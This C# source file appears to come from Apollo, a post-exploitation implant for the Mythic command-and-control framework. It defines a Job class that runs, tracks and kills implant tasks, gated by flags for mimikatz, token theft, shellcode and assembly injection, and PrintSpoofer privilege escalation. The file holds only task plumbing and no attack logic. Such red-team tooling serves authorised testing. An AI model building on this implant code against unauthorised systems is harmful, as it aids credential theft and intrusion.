#define COMMAND_NAME_UPPER

#if DEBUG
#undef JOBS
#undef JOBKILL
#undef MAKE_TOKEN
#undef STEAL_TOKEN
#undef REV2SELF
#undef GETPRIVS
#undef WHOAMI
#define MAKE_TOKEN
#define STEAL_TOKEN
#define REV2SELF
#define GETPRIVS
#define WHOAMI
#undef MIMIKATZ
#undef RUN
#undef SHELL
#undef POWERPICK
#undef PSINJECT
#undef EXECUTE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef SHINJECT
#undef LIST_INJECTION_TECHNIQUES
#undef GET_INJECTION_TECHNIQUE
#undef SET_INJECTION_TECHNIQUE
#undef PRINTSPOOFER
#undef SPAWN
#define PRINTSPOOFER
#define SPAWN
#define MIMIKATZ
#define RUN
#define SHELL
#define POWERPICK
#define PSINJECT
#define EXECUTE_ASSEMBLY
#define ASSEMBLY_INJECT
#define SHINJECT
#define LIST_INJECTION_TECHNIQUES
#define GET_INJECTION_TECHNIQUE
#define SET_INJECTION_TECHNIQUE
#define JOBKILL
#define JOBS
#endif

using System;
using System.Threading;
using Apollo.CommandModules;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.IO;
using Apollo.Tasks;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation.Runspaces;
using System.CodeDom;
using Mythic.Structs;

namespace Apollo
{
    namespace Jobs
    {

        /// <summary>
        /// The Job class is responsible for managing
        /// various PostEx jobs. 
        /// </summary>
        [Serializable]
        public class Job
        {
            static int JobCount = 0;
            public int JobID;
            public int ProcessID;
            public Task Task;
            public string TaskString;
            public delegate void KillJobDelegate();
            public KillJobDelegate OnKill = delegate () { };

            private Queue outputQueue = new Queue();
            private Queue syncOutputQueue;

            internal Thread _JobThread = null;
#if MIMIKATZ || RUN || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT || PRINTSPOOFER || SPAWN
            internal SacrificialProcesses.SacrificialProcess sacrificialProcess = null;
#endif
#if MIMIKATZ || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || PRINTSPOOFER
            internal static string[] unmanagedCommands { get; } = { "mimikatz", "powerpick", "psinject", "execute_assembly", "assembly_inject", "printspoofer" };
#endif

            public Job(Task task)
            {
                syncOutputQueue = Queue.Synchronized(outputQueue);
                JobID = ++JobCount;
                Task = task;
                TaskString = task.command;
                if (task.parameters != "")
                {
                    TaskString += String.Format(" {0}", task.parameters);
                }
            }


            /// <summary>
            /// Begin executing the job.
            /// </summary>
            public void Start()
            {
                if (_JobThread != null)
                    _JobThread.Start();
            }

            /// <summary>
            /// Retrieve the status of the job.
            /// </summary>
            /// <returns>TRUE if the job is still running, FALSE otherwise.</returns>
            public bool Status()
            {
                return _JobThread.IsAlive;
            }

            internal void AddOutput(object output, bool completed = false, string status = "")
            {
                Task.status = status;
                Task.completed = completed;
#if MIMIKATZ || RUN || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT || PRINTSPOOFER || SPAWN
                if (completed && sacrificialProcess != null)
                {
                    string msg;
                    if (sacrificialProcess.HasExited)
                        msg = $"{sacrificialProcess.command} (PID: {sacrificialProcess.PID}, Exit Code: {sacrificialProcess.ExitCode})";
                    else
                        msg = $"{sacrificialProcess.command} (PID: {sacrificialProcess.PID})";
                    if (output.GetType() != typeof(ApolloTaskResponse))
                    {
                        output = new ApolloTaskResponse(Task, output)
                        {
                            artifacts = new Artifact[]
                            {
                                new Artifact(){ artifact=msg, base_artifact="Process Create"}
                            }
                        };
                    }
                    else
                    {
                        ApolloTaskResponse temp = (ApolloTaskResponse)output;
                        if (temp.artifacts == null)
                            temp.artifacts = new Artifact[]
                            {
                                new Artifact(){artifact=msg, base_artifact="Process Create"}
                            };
                        output = temp;
                    }
                }
#endif
                if (output.GetType() == typeof(ApolloTaskResponse))
                {
                    var temp = (ApolloTaskResponse)output;
                    temp.completed = completed;
                    output = temp;
                }
                syncOutputQueue.Enqueue(output);
            }

            internal void SetError(object err)
            {
                AddOutput(err, true, "error");
            }

            internal void SetComplete()
            {
                AddOutput("", true);
            }

            internal void SetComplete(object msg)
            {
                AddOutput(msg, true);
            }

            internal void AddOutput(object output)
            {
                syncOutputQueue.Enqueue(output);
            }

            internal ApolloTaskResponse[] GetOutput()
            {
                List<ApolloTaskResponse> results = new List<ApolloTaskResponse>();
#if MIMIKATZ || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || PRINTSPOOFER
                List<string> output = new List<string>();
#endif
                while (syncOutputQueue.Count > 0)
                {
                    object msg = syncOutputQueue.Dequeue();
#if MIMIKATZ || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || PRINTSPOOFER
                    if (unmanagedCommands.Contains(Task.command) && msg.GetType() == typeof(string))
                    {
                        output.Add((string)msg);
                    }
                    else
                    {
#endif
                        if (msg.GetType() != typeof(ApolloTaskResponse))
                            msg = new ApolloTaskResponse(Task, msg);
                        results.Add((ApolloTaskResponse)msg);
#if MIMIKATZ || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || PRINTSPOOFER
                    }
#endif
                }
#if MIMIKATZ || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || PRINTSPOOFER
                if (output.Count > 0)
                {
                    ApolloTaskResponse temp = new ApolloTaskResponse(Task, string.Join("\n", output));
                    results.Add(temp);
                }
#endif
                return results.ToArray();
            }

            /// <summary>
            /// Kill the task associated with the job.
            /// </summary>
            /// <returns>TRUE if the job is killed successfully, FALSE otherwise</returns>
            public bool Kill()
            {
                try
                {
                    // Probably should have a way to signal for job to exit async to 
                    // gracefully release mutexes.
                    OnKill();
                    _JobThread.Abort();
#if MIMIKATZ || RUN || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT
                    if (sacrificialProcess != null)
                        sacrificialProcess.Kill();
#endif
                    SetError("Job aborted via jobkill.");
                    return true;
                }
                catch (Exception ex)
                {
                    return false;
                }
            }
        }

    }

}
